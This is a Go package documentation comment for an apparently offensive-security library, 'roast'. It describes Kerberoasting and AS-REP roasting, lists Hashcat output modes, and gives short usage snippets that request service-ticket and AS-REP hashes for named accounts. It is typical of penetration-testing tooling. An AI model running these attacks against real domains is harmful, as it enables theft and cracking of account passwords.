// Package roast provides Kerberos roasting attacks.
//
// # Overview
//
// Roasting attacks extract password hashes from Kerberos for offline cracking:
//
//   - Kerberoasting: Request service tickets, crack the service account password
//   - AS-REP Roasting: Attack accounts without pre-auth required
//
// # Output Formats
//
// Both attacks output hashes in formats compatible with:
//   - Hashcat (modes 13100, 18200, 19700)
//   - John the Ripper
//
// # Usage
//
//	// Kerberoast
//	results, _ := roast.Kerberoast(ctx, &roast.KerberoastRequest{
//	    TGT: myTGT,
//	    SPNs: []string{"MSSQLSvc/sql01:1433"},
//	})
//	for _, r := range results {
//	    fmt.Println(r.Hash) // Hashcat format
//	}
//
//	// AS-REP Roast
//	results, _ := roast.ASREPRoast(ctx, &roast.ASREPRoastRequest{
//	    Users: []string{"svc_backup"},
//	    Domain: "CORP.LOCAL",
//	})
package roast
